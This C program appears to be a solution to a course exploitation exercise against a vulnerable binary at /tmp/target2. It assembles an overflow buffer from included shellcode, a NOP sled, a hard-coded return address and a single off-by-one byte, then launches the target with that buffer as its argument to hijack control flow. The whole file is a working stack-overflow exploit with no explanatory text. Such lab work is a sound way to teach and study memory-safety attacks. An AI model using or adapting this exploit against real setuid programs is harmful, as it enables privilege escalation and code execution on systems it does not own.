#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char buff[241];

  for (int i = 0; i < 45; i++)
{
  buff[i] = shellcode[i];
}
 
  for (int i = 0; i < 191; i++)
{
  buff[i+45] = '\x90';
}

  buff[236] = '\x6c';
  buff[237] = '\xfc';
  buff[238] = '\xff';
  buff[239] = '\xbf';

  buff[240] = '\x54';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
